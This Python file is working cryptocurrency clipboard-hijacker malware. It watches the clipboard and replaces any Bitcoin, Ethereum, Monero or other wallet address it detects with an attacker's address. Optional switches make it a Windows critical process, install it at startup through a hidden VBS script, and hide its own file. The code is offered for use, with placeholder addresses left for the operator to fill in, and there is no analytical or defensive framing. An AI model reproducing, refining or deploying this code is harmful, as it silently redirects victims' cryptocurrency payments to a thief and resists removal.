import pyperclip
import time
import re

CRITICAL_PROCCESS = False
ADD_TO_STARTUP = False
HIDE_BINARIES = False

def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
    print("[*] Established as critical process")  
    

def startup():
    import ctypes
    import os
    import sys
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:  
        path = sys.argv[0]
        os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
        print(path)
        e = r"""
        Set objShell = WScript.CreateObject("WScript.Shell")
        objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
        """.format(os.path.basename(sys.argv[0]))
        with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
            f.write(e)
            f.close()
        print("[*] Added to startup")  
    else:
        print("[*] Failed to add to startup. This command requires admin privileges")

def hide():
    import os
    import inspect
    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
    os.system("""attrib +h "{}" """.format(cmd237))
    print("[*] Binaries successfully hidden")

def check(clipboard):
    regex = {
        "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "tron": "^T[a-zA-Z0-9]{33}$",
        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xrp": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
        "eth": "^0x[a-fA-F0-9]{40}$",
    }
    for key, value in regex.items():
        if bool(re.search(value, clipboard)):
            return key
    return 0

def replace_crypto(data):
    my_addresses = {
                    "lite": "YOUR-LITE-ADDRESS",
                    "dot": "YOUR-DOT-ADDRESS",
                    "tron": "YOUR-TRON-ADDRESS",
                    "btc": "YOUR-BTC-ADDRESS",
                    "xrp": "YOUR-XRP-ADDRESS",
                    "doge": "YOUR-DOGE-ADDRESS",
                    "xmr": "YOUR-XMR-ADDRESS",
                    "eth": "YOUR-ETH-ADDRESS",
                    "ada": "YOUR-ADA-ADDRESS",
                    "dash": "YOUR-DASH-ADDRESS",
                    }
    if data != 0 and my_addresses[data] != "null":
        pyperclip.copy(my_addresses[data])
    return 0

def main():
    while 1:
        time.sleep(0.7)
        clipboard = pyperclip.paste()
        data = check(clipboard)
        replace_crypto(data)

if __name__ == "__main__":
    if CRITICAL_PROCCESS:
        critproc()
    if ADD_TO_STARTUP:
        startup()        
    if HIDE_BINARIES:
        hide()    
    main()
